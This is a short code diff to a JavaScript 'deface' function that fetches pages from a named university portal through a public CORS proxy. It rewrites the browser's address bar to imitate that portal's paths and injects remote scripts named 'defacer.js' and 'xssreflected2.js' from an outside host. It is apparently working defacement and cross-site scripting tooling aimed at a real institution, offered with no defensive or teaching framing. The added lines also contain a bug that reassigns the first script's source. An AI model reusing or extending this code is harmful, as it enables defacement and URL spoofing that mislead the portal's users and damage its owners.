@@ -10,8 +10,12 @@ function changeURL(newUrl, title = '') {
     console.log(`URL replaced with: ${newUrl}`);
 }
 
-function deface(url) {
+function deface(url, title = '') {
     const corsProxyUrl = 'https://corsproxy.io/?url=';
+    // Extract the part after the domain
+    const path = url.replace("https://aims.ucc-caloocan.edu.ph", "");
+    changeURL(path, title);
+
 
     fetch(corsProxyUrl + url)
       .then(response => response.text()) // Get the response as text (HTML content)
@@ -22,6 +26,10 @@ function deface(url) {
         // Re-attach the JavaScript
         const script = document.createElement("script");
         script.src = "https://cybercutie0.github.io/-/defacer.js";
+        document.head.appendChild(script);
+
+        const script2 = document.createElement("script");
+        script.src = "https://cybercutie0.github.io/-/xssreflected2.js";
         document.head.appendChild(script);
       })
       .catch(error => console.error('Error:', error));
